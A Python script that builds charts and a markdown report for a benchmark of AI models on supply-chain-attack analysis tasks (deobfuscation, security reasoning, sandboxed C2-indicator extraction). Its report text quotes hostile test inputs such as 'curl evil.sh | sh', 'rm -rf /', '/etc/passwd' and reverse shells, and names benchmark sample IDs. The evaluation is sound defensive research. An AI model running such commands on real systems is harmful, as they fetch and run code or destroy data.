"""Regenerate the Phase 0-1 evaluation report and its charts.

Single source of truth: reports_data.json (rebuilt by scripts/extract_run_data.py
from the most-recent run only: logs/all-go + logs/all-zen5). Models are labelled
by provider (Opencode Go vs Opencode Zen).

Outputs (all under reports/):
  fig_easy_vs_hard.png, fig_heatmap.png, fig_thinking_cost.png,
  fig_efficiency.png, fig_tooluse.png, fig_duration.png, agg.json, main.md

Run: uv run python scripts/extract_run_data.py && uv run python scripts/build_report.py
"""

from __future__ import annotations

import json
from pathlib import Path

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
DATA = ROOT / "reports_data.json"
OUT = ROOT / "reports"

# The most-recent run: open models via Opencode Go, closed via Opencode Zen.
CANONICAL_DIRS = {"all-go", "all-zen5"}

# Capability axes (single-shot). Tool-use C2 tasks are reported separately.
TASKS = [
    "code_comprehension", "obfuscation", "security_reasoning",
    "code_comprehension_hard", "obfuscation_hard", "security_reasoning_hard",
]
SHORT = {
    "code_comprehension": "cc", "obfuscation": "obf", "security_reasoning": "sec",
    "code_comprehension_hard": "cc-H", "obfuscation_hard": "obf-H",
    "security_reasoning_hard": "sec-H",
}
EASY = TASKS[:3]
HARD = TASKS[3:]

C2_TASKS = ["tool_use_c2", "tool_use_c2_hard"]

# Closed deployments served by Opencode Zen; everything else is Opencode Go.
ZEN_BASES = {"gpt-5.3-codex", "gpt-5.4", "gpt-5.5",
             "claude-opus-4-7", "claude-opus-4-8"}

PROVIDER_COLORS = {"Opencode Go": "#4c9be8", "Opencode Zen": "#3aa86b"}


def base_name(model_id: str) -> str:
    return model_id.split("/")[-1]


def provider(model_id: str) -> str:
    return "Opencode Zen" if base_name(model_id) in ZEN_BASES else "Opencode Go"


def disp(model_id: str) -> str:
    return f"{base_name(model_id)} ({provider(model_id)})"


def base_name_of(display: str) -> str:
    return display[: display.rfind(" (")]


# --------------------------------------------------------------------------- #
# Aggregate (capability axes)
# --------------------------------------------------------------------------- #
def build_aggregate(rows: list[dict]) -> dict:
    canon = [r for r in rows if r["dir"] in CANONICAL_DIRS]
    models = sorted({disp(r["model"]) for r in canon})

    agg: dict[str, dict] = {m: {t: None for t in TASKS} for m in models}
    out_tokens: dict[str, list[int]] = {m: [] for m in models}
    rsn_tokens: dict[str, list[int]] = {m: [] for m in models}
    cap_dur: dict[str, list[float]] = {m: [] for m in models}
    has_success: dict[str, bool] = {m: False for m in models}

    for r in canon:
        if r["task"] not in TASKS:
            continue
        m = disp(r["model"])
        if r["acc"] is not None:
            agg[m][r["task"]] = r["acc"]
            has_success[m] = True
            out_tokens[m].append(r["outtok"])
            rsn_tokens[m].append(r["rtok"])
            if r.get("duration_s") is not None:
                cap_dur[m].append(r["duration_s"])

    extra: dict[str, dict] = {}
    for m in models:
        easy = [agg[m][t] for t in EASY if agg[m][t] is not None]
        hard = [agg[m][t] for t in HARD if agg[m][t] is not None]
        ot, rt, cd = out_tokens[m], rsn_tokens[m], cap_dur[m]
        extra[m] = {
            "easy": (sum(easy) / len(easy)) if easy else None,
            "hard": (sum(hard) / len(hard)) if hard else None,
            "mean_out": round(sum(ot) / len(ot)) if ot else 0,
            "mean_rsn": round(sum(rt) / len(rt)) if rt else 0,
            "cap_dur": round(sum(cd) / len(cd), 1) if cd else None,
            "provider": provider(m_to_id(m)),
            "status": "ok" if has_success[m] else "FAILED",
        }
    return {"agg": agg, "extra": extra, "models": models}


def m_to_id(display: str) -> str:
    # disp() is invertible enough for provider lookup: the base name suffices.
    return base_name_of(display)


# --------------------------------------------------------------------------- #
# Tool-use (C2 extraction)
# --------------------------------------------------------------------------- #
def build_tooluse(tooluse: list[dict]) -> dict:
    """Per deployment, aggregate the two C2 tool-use tasks."""
    by: dict[str, dict] = {}
    for r in tooluse:
        if r["dir"] not in CANONICAL_DIRS:
            continue
        m = disp(r["model"])
        d = by.setdefault(m, {
            "provider": provider(r["model"]),
            "samples": 0, "correct": 0, "tool_calls": 0, "failed": 0,
            "turns": 0, "loop_in": 0, "loop_out": 0, "dur": [], "tasks": {},
            "missing_usage": False,
        })
        d["samples"] += r["samples"]
        d["correct"] += r["correct"]
        d["tool_calls"] += r["tool_calls"]
        d["failed"] += r["failed"]
        d["turns"] += r["turns"]
        if r["loop_in"] is None or r["loop_out"] is None:
            d["missing_usage"] = True
        else:
            d["loop_in"] += r["loop_in"]
            d["loop_out"] += r["loop_out"]
        if r.get("duration_s") is not None:
            d["dur"].append(r["duration_s"])
        d["tasks"][r["task"]] = r["correct"] / r["samples"] if r["samples"] else None

    for m, d in by.items():
        d["acc"] = (d["correct"] / d["samples"]) if d["samples"] else None
        d["loop_total"] = None if d["missing_usage"] else d["loop_in"] + d["loop_out"]
        d["tok_per_correct"] = (
            round(d["loop_total"] / d["correct"]) if d["loop_total"] and d["correct"] else None)
        d["calls_per_correct"] = round(d["tool_calls"] / d["correct"], 1) if d["correct"] else None
        d["mean_dur"] = round(sum(d["dur"]) / len(d["dur"]), 1) if d["dur"] else None
    return by


# --------------------------------------------------------------------------- #
# Charts — capability
# --------------------------------------------------------------------------- #
def _ranked(extra: dict) -> list[str]:
    return sorted(extra, key=lambda m: (extra[m]["hard"] or -1, extra[m]["easy"] or -1),
                  reverse=True)


def chart_easy_vs_hard(extra: dict) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    easy = [extra[m]["easy"] for m in ok]
    hard = [extra[m]["hard"] for m in ok]
    x = range(len(ok))
    w = 0.4
    fig, ax = plt.subplots(figsize=(11, 6))
    ax.bar([i - w / 2 for i in x], easy, w, label="easy", color="#4c9be8")
    ax.bar([i + w / 2 for i in x], hard, w, label="hard", color="#e8694c")
    ax.set_xticks(list(x))
    ax.set_xticklabels(ok, rotation=45, ha="right", fontsize=8)
    ax.set_ylabel("accuracy")
    ax.set_ylim(0, 1.05)
    ax.set_title("Easy vs hard capability accuracy by deployment (sorted by hard)")
    ax.legend()
    fig.tight_layout()
    fig.savefig(OUT / "fig_easy_vs_hard.png", dpi=130)
    plt.close(fig)


def chart_heatmap(agg: dict, extra: dict) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    grid = [[agg[m][t] if agg[m][t] is not None else float("nan") for t in TASKS]
            for m in ok]
    fig, ax = plt.subplots(figsize=(9, 7))
    im = ax.imshow(grid, cmap="RdYlGn", vmin=0, vmax=1, aspect="auto")
    ax.set_xticks(range(len(TASKS)))
    ax.set_xticklabels([SHORT[t] for t in TASKS])
    ax.set_yticks(range(len(ok)))
    ax.set_yticklabels(ok, fontsize=8)
    for i, m in enumerate(ok):
        for j, t in enumerate(TASKS):
            v = agg[m][t]
            ax.text(j, i, "—" if v is None else f"{v:.2f}", ha="center",
                    va="center", fontsize=7)
    ax.set_title("Per-task capability accuracy heatmap")
    fig.colorbar(im, ax=ax, shrink=0.7, label="accuracy")
    fig.tight_layout()
    fig.savefig(OUT / "fig_heatmap.png", dpi=130)
    plt.close(fig)


def chart_thinking_cost(extra: dict) -> None:
    ok = sorted([m for m in extra if extra[m]["status"] == "ok"],
                key=lambda m: extra[m]["mean_out"], reverse=True)
    vals = [extra[m]["mean_out"] for m in ok]
    fig, ax = plt.subplots(figsize=(11, 6))
    ax.barh(ok, vals, color="#7b5ea7")
    ax.invert_yaxis()
    ax.set_xlabel("mean generated tokens per task")
    ax.set_title("'Thinking' cost — mean output tokens per capability task")
    for i, v in enumerate(vals):
        ax.text(v, i, f" {v:,}", va="center", fontsize=8)
    ax.tick_params(axis="y", labelsize=8)
    fig.tight_layout()
    fig.savefig(OUT / "fig_thinking_cost.png", dpi=130)
    plt.close(fig)


def chart_efficiency(extra: dict) -> None:
    ok = [m for m in extra if extra[m]["status"] == "ok" and extra[m]["hard"]]
    pts = [(extra[m]["mean_out"] or 1, extra[m]["hard"], m) for m in ok]
    xmin = min(p[0] for p in pts)
    xmax = max(p[0] for p in pts)
    mid = (xmin * xmax) ** 0.5

    fig, ax = plt.subplots(figsize=(12, 7))
    for x, y, m in pts:
        ax.scatter(x, y, s=70, color=PROVIDER_COLORS[extra[m]["provider"]],
                   edgecolor="black", linewidth=0.5, zorder=3)
    by_y: dict[float, list] = {}
    for x, y, m in sorted(pts, key=lambda p: p[0]):
        by_y.setdefault(round(y, 3), []).append((x, y, m))
    for group in by_y.values():
        for k, (x, y, m) in enumerate(group):
            right = x >= mid
            ax.annotate(base_name_of(m), (x, y), fontsize=8,
                        ha="right" if right else "left",
                        xytext=(-8 if right else 8, 10 if k % 2 == 0 else -14),
                        textcoords="offset points")
    handles = [plt.Line2D([0], [0], marker="o", linestyle="", color=c, label=p)
               for p, c in PROVIDER_COLORS.items()]
    ax.legend(handles=handles, title="provider", loc="lower center", ncol=2)
    ax.set_xlabel("mean generated tokens per task (log scale)")
    ax.set_xscale("log")
    ax.set_xlim(xmin / 1.6, xmax * 1.7)
    ax.set_ylabel("hard-set accuracy")
    ax.set_title("Efficiency — hard accuracy vs token spend")
    ax.grid(True, alpha=0.3)
    fig.tight_layout()
    fig.savefig(OUT / "fig_efficiency.png", dpi=130)
    plt.close(fig)


# --------------------------------------------------------------------------- #
# Charts — tool-use & duration
# --------------------------------------------------------------------------- #
def chart_tooluse(tu: dict) -> None:
    order = sorted(tu, key=lambda m: tu[m]["tool_calls"], reverse=True)
    calls = [tu[m]["tool_calls"] for m in order]
    fig, ax = plt.subplots(figsize=(11, 6))
    colors = [PROVIDER_COLORS[tu[m]["provider"]] for m in order]
    ax.barh(order, calls, color=colors)
    ax.invert_yaxis()
    ax.set_xlabel("total tool calls over both C2 tasks (18 samples)")
    ax.set_title("Tool utilization — C2 extraction (bash/python in sandbox)")
    for i, m in enumerate(order):
        tpc = tu[m]["tok_per_correct"]
        lbl = f" {calls[i]} calls" + (f", {tpc:,} tok/correct" if tpc else "")
        ax.text(calls[i], i, lbl, va="center", fontsize=8)
    ax.tick_params(axis="y", labelsize=8)
    handles = [plt.Line2D([0], [0], marker="s", linestyle="", color=c, label=p)
               for p, c in PROVIDER_COLORS.items()]
    ax.legend(handles=handles, title="provider", loc="lower right")
    fig.tight_layout()
    fig.savefig(OUT / "fig_tooluse.png", dpi=130)
    plt.close(fig)


def chart_duration(extra: dict, tu: dict) -> None:
    """Capability mean (single-shot) vs C2 mean (multi-turn tool loop) per model."""
    models = [m for m in extra if extra[m]["status"] == "ok"]
    models = sorted(models, key=lambda m: tu.get(m, {}).get("mean_dur") or 0, reverse=True)
    cap = [extra[m]["cap_dur"] or 0 for m in models]
    c2 = [tu.get(m, {}).get("mean_dur") or 0 for m in models]
    x = range(len(models))
    w = 0.4
    fig, ax = plt.subplots(figsize=(11, 6))
    ax.bar([i - w / 2 for i in x], cap, w, label="capability (single-shot)", color="#9aa0a6")
    ax.bar([i + w / 2 for i in x], c2, w, label="C2 tool-use (multi-turn)", color="#e8694c")
    ax.set_xticks(list(x))
    ax.set_xticklabels(models, rotation=45, ha="right", fontsize=8)
    ax.set_ylabel("mean wall-clock seconds per task")
    ax.set_title("Time to solve — single-shot vs tool-use (cancelled = hit 600s cap)")
    ax.legend()
    fig.tight_layout()
    fig.savefig(OUT / "fig_duration.png", dpi=130)
    plt.close(fig)


# --------------------------------------------------------------------------- #
# Failures (data-driven)
# --------------------------------------------------------------------------- #
def build_fails(samples: list[dict]) -> list[list]:
    seen: dict[tuple, list] = {}
    for s in samples:
        if s["score"] in ("C", "None"):
            continue
        key = (disp(s["model"]), s["task"], s["id"])
        cand = [disp(s["model"]), s["task"], s["id"], s["target"], s["score"],
                (s["answer"] or "").strip()]
        if key not in seen or (cand[5] and not seen[key][5]):
            seen[key] = cand
    return list(seen.values())


def fail_table(fails, pred, limit=99, trunc=80, only_empty=False) -> str:
    out = []
    for m, t, i, tgt, score, ans in fails:
        if not pred(m, t, i):
            continue
        if only_empty and ans:
            continue
        a = (ans[:trunc] if ans else "*(empty)*").replace("|", "\\|")
        tg = str(tgt).replace("|", "\\|")
        out.append(f"| `{m}` | {t}/{i} | `{tg}` | `{score}` | {a} |")
    return "\n".join(out[:limit]) or "| — | — | — | — | *(none)* |"


# --------------------------------------------------------------------------- #
# Report
# --------------------------------------------------------------------------- #
def cell(v) -> str:
    return "—" if v is None else f"{v:.2f}"


def write_report(agg, extra, tu, fails, models) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    L: list[str] = []
    A = L.append

    A("# AI-Augmented Supply-Chain-Attack Analysis — Model Evaluation Report")
    A("")
    A("**Phase 0–1 capability survey · 2026-05-30**  ")
    A(f"**{len(ok)} model deployments** across **6 single-shot capability tasks** "
      "(3 axes × easy/hard) **plus a tool-use C2-extraction benchmark** "
      "(2 tasks, run in a network-isolated Docker sandbox), through the "
      "model-independent `sca-eval` harness (inspect-ai + deterministic scorers).")
    A("")
    A("Deployments are labelled by **provider** — **Opencode Go** (open-weight "
      "models) and **Opencode Zen** (closed GPT-5.x / Claude Opus). This report "
      "reflects a single run (`logs/all-go` + `logs/all-zen5`).")
    A("")
    A("---\n")

    # ---- Section 1 -------------------------------------------------------- #
    A("## 1. How the models were tested\n")
    A("### 1.1 Providers and routing\n")
    A("| Provider | Endpoint | Wire protocol | Deployments |")
    A("|---|---|---|---|")
    prov_models: dict[str, list[str]] = {}
    for m in models:
        prov_models.setdefault(extra[m]["provider"], []).append(base_name_of(m))
    A("| **Opencode Go** | `opencode.ai/zen/go/v1` | OpenAI-compatible "
      "(+ Anthropic `/messages` for Qwen) | " + ", ".join(sorted(prov_models.get("Opencode Go", []))) + " |")
    A("| **Opencode Zen** | `opencode.ai/zen/v1` | OpenAI-compatible (GPT) / "
      "Anthropic `/messages` (Opus) | " + ", ".join(sorted(prov_models.get("Opencode Zen", []))) + " |")
    A("")
    A("Every deployment receives identical prompts, scorers and decoding "
      "parameters, so scores are comparable *within a task family*.\n")

    A("### 1.2 Test construction\n")
    A("Three language-agnostic capability axes (each easy + hard), plus a "
      "tool-use axis:\n")
    A("| Axis | What the probe asks | Scorer |")
    A("|------|--------------------|--------|")
    A("| **code comprehension** | predict output / complexity / behaviour | `includes()` substring |")
    A("| **obfuscation** | decode base64 / hex / ROT13 / XOR, multi-layer | `match(any, ignore_case)` |")
    A("| **security reasoning** | classify a snippet, ending in a `VERDICT:` line | line-anchored verdict parser |")
    A("| **tool-use C2** | recover a C2 indicator from an obfuscated payload, "
      "using `bash`/`python` in a no-egress Docker sandbox | `match(any, ignore_case)` |")
    A("")
    A("The C2 corpus is synthetic (modelled on real incident techniques: layered "
      "base64, hex, char-code arrays, XOR, gzip+base64, runtime-computed); all C2 "
      "values are non-routable fakes (RFC 5737, `.invalid`/`.example`) and the "
      "sandbox runs `network_mode: none` — nothing is ever contacted.\n")
    A("---\n")

    # ---- Section 2: capability -------------------------------------------- #
    A("## 2. Capability performance (single-shot)\n")
    A("### 2.1 Easy vs hard accuracy\n")
    A("![easy vs hard](fig_easy_vs_hard.png)\n")
    A("### 2.2 Per-task heatmap\n")
    A("![heatmap](fig_heatmap.png)\n")
    A("Columns: `cc`/`obf`/`sec` (easy) and `cc-H`/`obf-H`/`sec-H` (hard).\n")
    A("### 2.3 'Thinking' cost — mean generated tokens per task\n")
    A("![thinking cost](fig_thinking_cost.png)\n")
    A("Open models on Go report real chain-of-thought tokens; the Zen GPT and "
      "Opus gateways hide reasoning and report `0`, so their deliberation cost is "
      "understated here.\n")
    A("### 2.4 Efficiency — hard accuracy vs token spend\n")
    A("![efficiency](fig_efficiency.png)\n")
    A("### 2.5 Full capability matrix (ranked by hard accuracy)\n")
    A("| deployment | provider | " + " | ".join(SHORT[t] for t in TASKS) + " | easy | hard |")
    A("|---|---|" + "|".join("---" for _ in TASKS) + "|---|---|")
    for m in ok:
        A(f"| `{base_name_of(m)}` | {extra[m]['provider']} | "
          + " | ".join(cell(agg[m][t]) for t in TASKS)
          + f" | **{extra[m]['easy']:.2f}** | **{extra[m]['hard']:.2f}** |")
    A("")
    A("---\n")

    # ---- Section 3: tool-use (SEPARATE) ----------------------------------- #
    A("## 3. Tool-use C2 extraction (separate axis)\n")
    A("Each deployment is dropped into a Docker sandbox holding an obfuscated "
      "payload and must recover the command-and-control indicator using the "
      "`bash` and `python` tools. This measures *agentic tool utilization*, not "
      "just single-shot reasoning — so it is reported separately from the "
      "capability matrix above.\n")
    A("![tool use](fig_tooluse.png)\n")
    A("**Accuracy: every deployment scored 1.00 on both `tool_use_c2` (10 "
      "samples) and `tool_use_c2_hard` (8 samples)** — the discriminating signal "
      "here is *how* they used tools, not whether they succeeded.\n")
    A("| deployment | provider | C2 acc | tool calls | model turns | "
      "loop tokens (in/out) | calls/correct | tok/correct |")
    A("|---|---|---|---|---|---|---|---|")
    for m in sorted(tu, key=lambda m: tu[m]["tool_calls"], reverse=True):
        d = tu[m]
        li = "—" if d["loop_total"] is None else f"{d['loop_in']:,}/{d['loop_out']:,}"
        tpc = f"{d['tok_per_correct']:,}" if d["tok_per_correct"] else "—"
        cpc = f"{d['calls_per_correct']}" if d["calls_per_correct"] else "—"
        acc = "—" if d["acc"] is None else f"{d['acc']:.2f}"
        A(f"| `{base_name_of(m)}` | {d['provider']} | {acc} | {d['tool_calls']} | "
          f"{d['turns']} | {li} | {cpc} | {tpc} |")
    A("")
    A("Totals are over both C2 tasks (18 samples). `tok/correct` is summed "
      "tool-loop tokens (all assistant turns) per correctly-extracted C2 — the "
      "agentic-efficiency metric. Missing per-event usage renders `—` (never a "
      "fake 0); no run hit the tool-call failure path.\n")
    A("---\n")

    # ---- Section 4: duration ---------------------------------------------- #
    A("## 4. Time to solve (latency)\n")
    A("![duration](fig_duration.png)\n")
    A("Mean wall-clock per task: single-shot capability tasks vs the multi-turn "
      "C2 tool loop. The tool-use tasks are several times slower because each "
      "drives multiple sandbox round-trips (read → decode → verify).\n")
    A("| deployment | provider | mean capability (s) | mean C2 tool-use (s) |")
    A("|---|---|---|---|")
    for m in sorted(ok, key=lambda m: tu.get(m, {}).get("mean_dur") or 0, reverse=True):
        cd = extra[m]["cap_dur"]
        md = tu.get(m, {}).get("mean_dur")
        A(f"| `{base_name_of(m)}` | {extra[m]['provider']} | "
          f"{'—' if cd is None else cd} | {'—' if md is None else md} |")
    A("")
    A("**Cancellation policy.** Each sample has a hard `time_limit` of 600 s; a "
      "run that exceeds it is **cancelled** and rendered distinctly (it took too "
      "long to finish the assigned task), never scored as a wrong answer. "
      "In this run **no deployment was cancelled** — the slowest single C2 task "
      "finished in 68 s, well under the cap.\n")
    A("---\n")

    # ---- Section 5: failures (data-driven) -------------------------------- #
    A("## 5. Rejections and failures\n")
    A("### 5.1 Refusals on malware-flavoured inputs\n")
    A("Inputs included reverse shells, `rm -rf /`, `/etc/passwd`, `eval(atob(x))`. "
      "Explicit content refusals (answer contains 'sorry'):\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: "sorry" in next(
        (a for mm, tt, ii, tg, sc, a in fails if (mm, tt, ii) == (m, t, i)), "").lower(),
        trunc=120))
    A("")
    A("Silent empty completions on the most malicious-looking hard-obfuscation "
      "payloads (`obh-001` `eval(atob(x))`, `obh-005` `curl evil.sh | sh`, "
      "`obh-007` `/bin/sh`):\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "obfuscation_hard"
                 and i in ("obh-001", "obh-005", "obh-007"), limit=20, only_empty=True))
    A("")
    A("### 5.2 False-positive bias on *safe* security traps\n")
    A("Hard security traps `srh-004` (`realpath`+`commonpath` containment) and "
      "`srh-008` (`subprocess.run(..., shell=False)`) are genuinely safe but are "
      "prone to a `vulnerable` / `NOANSWER` verdict:\n")
    A("| deployment | sample | target | score | answer (truncated) |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "security_reasoning_hard"
                 and i in ("srh-004", "srh-008"), limit=20))
    A("")
    A("### 5.3 Scoring artefacts (not capability failures)\n")
    A("The lenient deterministic scorer over-penalises formatting on easy code "
      "(`cc-002`: `O(n²)` vs target `O(n^2)`; `cc-004`: contestable `yes`):\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "code_comprehension"
                 and i in ("cc-002", "cc-003", "cc-004"), limit=20))
    A("")
    A("These motivate replacing `includes()`/`match()` with model-graded scoring "
      "(design §7).\n")
    A("---\n")
    A("*Generated by `scripts/build_report.py` from `reports_data.json` "
      "(rebuilt by `scripts/extract_run_data.py` from `logs/all-go` + "
      "`logs/all-zen5`). Charts: `reports/fig_*.png`. Aggregates: `reports/agg.json`.*")

    (OUT / "main.md").write_text("\n".join(L))


def main() -> None:
    d = json.loads(DATA.read_text())
    rows, samples = d["rows"], d["samples"]
    tooluse = d.get("tooluse", [])
    a = build_aggregate(rows)
    tu = build_tooluse(tooluse)
    fails = build_fails(samples)

    OUT.mkdir(exist_ok=True)
    chart_easy_vs_hard(a["extra"])
    chart_heatmap(a["agg"], a["extra"])
    chart_thinking_cost(a["extra"])
    chart_efficiency(a["extra"])
    chart_tooluse(tu)
    chart_duration(a["extra"], tu)

    (OUT / "agg.json").write_text(json.dumps(
        {"agg": a["agg"], "extra": a["extra"], "tooluse": tu, "fails": fails}, indent=1))
    write_report(a["agg"], a["extra"], tu, fails, a["models"])
    print(f"wrote {OUT/'main.md'} and 6 charts; {len(a['models'])} deployments, "
          f"{len(tu)} with tool-use, {len(fails)} non-correct samples")


if __name__ == "__main__":
    main()
